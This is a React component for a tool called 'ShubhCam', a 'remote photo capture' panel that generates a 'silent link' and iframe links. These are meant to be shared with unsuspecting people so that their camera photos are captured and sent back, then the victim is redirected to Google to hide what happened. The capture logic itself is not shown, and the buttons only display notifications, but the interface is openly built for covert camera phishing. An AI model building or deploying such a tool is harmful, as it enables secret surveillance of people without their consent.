import { useState } from "react";
import { Camera, Link2, Image, Copy, Settings, RefreshCw, Zap } from "lucide-react";
import { Button } from "./ui/button";
import { Input } from "./ui/input";
import { toast } from "@/hooks/use-toast";
import { cn } from "@/lib/utils";

const ShubhCam = () => {
  const [activeTab, setActiveTab] = useState<"link" | "photos">("link");
  const [redirectUrl, setRedirectUrl] = useState("https://google.com");
  const [photos, setPhotos] = useState<string[]>([]);
  const [sessionId] = useState(() => Math.random().toString(36).substring(2, 12));

  const captureLink = `https://darkshubh8.vercel.app/s?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}`;

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copied!",
      description: "Link copied to clipboard",
    });
  };

  const generateIframeLink = () => {
    toast({
      title: "IFrame Link Generated",
      description: "Your capture link with iframe is ready",
    });
  };

  const newSession = () => {
    toast({
      title: "New Session Created",
      description: "A fresh session has been initialized",
    });
  };

  const refreshPhotos = () => {
    toast({
      title: "Refreshing Photos",
      description: "Checking for new captures...",
    });
  };

  return (
    <div className="border-2 border-neon-green rounded-lg p-6 bg-card/30 backdrop-blur mt-6">
      {/* Header */}
      <div className="flex items-center gap-3 mb-4">
        <div className="p-2 rounded-lg border border-neon-cyan bg-neon-cyan/10">
          <Camera className="w-6 h-6 text-neon-cyan" />
        </div>
        <div>
          <h2 className="font-display font-bold text-xl">
            <span className="text-neon-green">SHUBH</span>
            <span className="text-neon-pink">CAM</span>
          </h2>
          <p className="text-muted-foreground text-xs flex items-center gap-1">
            <Zap className="w-3 h-3" /> REMOTE PHOTO CAPTURE
          </p>
        </div>
      </div>

      {/* Tabs */}
      <div className="flex rounded-lg overflow-hidden border border-neon-green/50 mb-6">
        <button
          onClick={() => setActiveTab("link")}
          className={cn(
            "flex-1 py-3 px-4 flex items-center justify-center gap-2 transition-all",
            activeTab === "link"
              ? "bg-neon-green text-background font-bold"
              : "bg-card text-muted-foreground hover:bg-muted"
          )}
        >
          <Zap className="w-4 h-4" /> LINK
        </button>
        <button
          onClick={() => setActiveTab("photos")}
          className={cn(
            "flex-1 py-3 px-4 flex items-center justify-center gap-2 transition-all",
            activeTab === "photos"
              ? "bg-neon-green text-background font-bold"
              : "bg-card text-muted-foreground hover:bg-muted"
          )}
        >
          <Image className="w-4 h-4" /> PHOTOS ({photos.length})
        </button>
      </div>

      {activeTab === "link" ? (
        <div className="space-y-6">
          {/* How it works */}
          <div className="bg-muted/50 rounded-lg p-4 border border-border">
            <h3 className="font-bold text-foreground mb-2">How it works:</h3>
            <ol className="text-sm text-muted-foreground space-y-1 list-decimal list-inside">
              <li>Copy the link below</li>
              <li>Share with anyone</li>
              <li>When they click & capture, photo appears here!</li>
            </ol>
          </div>

          {/* Silent Link */}
          <div>
            <div className="flex items-center gap-2 mb-2">
              <span className="text-neon-cyan">👁</span>
              <h3 className="text-neon-green font-bold">SILENT LINK (Auto Capture)</h3>
              <Settings className="w-4 h-4 text-muted-foreground ml-auto cursor-pointer hover:text-foreground" />
            </div>
            <div className="flex gap-2">
              <Input
                value={captureLink}
                readOnly
                className="bg-input border-neon-green/50 text-neon-green text-sm font-mono"
              />
              <Button
                variant="outline"
                size="icon"
                onClick={() => copyToClipboard(captureLink)}
                className="border-neon-green text-neon-green hover:bg-neon-green/10"
              >
                <Copy className="w-4 h-4" />
              </Button>
            </div>
            <p className="text-neon-orange text-xs mt-2">
              ⚠ Capture ke baad redirect: {redirectUrl}
            </p>
          </div>

          {/* IFrame Link Generator */}
          <div>
            <div className="flex items-center gap-2 mb-2">
              <span className="text-neon-cyan">🖥</span>
              <h3 className="text-neon-cyan font-bold">IFRAME LINK GENERATOR</h3>
            </div>
            <Input
              value={redirectUrl}
              onChange={(e) => setRedirectUrl(e.target.value)}
              placeholder="https://google.com"
              className="bg-input border-neon-green/50 text-neon-green mb-3"
            />
            <Button
              onClick={generateIframeLink}
              className="w-full bg-neon-green text-background font-bold hover:bg-neon-green/90"
            >
              <Link2 className="w-4 h-4 mr-2" /> GENERATE IFRAME LINK
            </Button>
            <p className="text-neon-purple text-xs mt-2">
              💡 Kisi bhi URL ke saath capture link generate kareln - photo capture ke baad user us URL pe redirect hoga
            </p>
          </div>

          {/* Action Buttons */}
          <div className="space-y-3">
            <Button
              onClick={newSession}
              variant="outline"
              className="w-full border-neon-green text-neon-green hover:bg-neon-green/10"
            >
              <Link2 className="w-4 h-4 mr-2" /> NEW SESSION
            </Button>
            <Button
              onClick={refreshPhotos}
              className="w-full bg-neon-pink text-background font-bold hover:bg-neon-pink/90"
            >
              <RefreshCw className="w-4 h-4 mr-2" /> REFRESH PHOTOS
            </Button>
          </div>
        </div>
      ) : (
        <div className="min-h-[200px] flex items-center justify-center">
          {photos.length === 0 ? (
            <div className="text-center text-muted-foreground">
              <Camera className="w-12 h-12 mx-auto mb-3 opacity-50" />
              <p>No photos captured yet</p>
              <p className="text-sm">Share your link to start capturing!</p>
            </div>
          ) : (
            <div className="grid grid-cols-2 gap-4">
              {photos.map((photo, i) => (
                <img key={i} src={photo} alt={`Capture ${i + 1}`} className="rounded-lg" />
              ))}
            </div>
          )}
        </div>
      )}
    </div>
  );
};

export default ShubhCam;
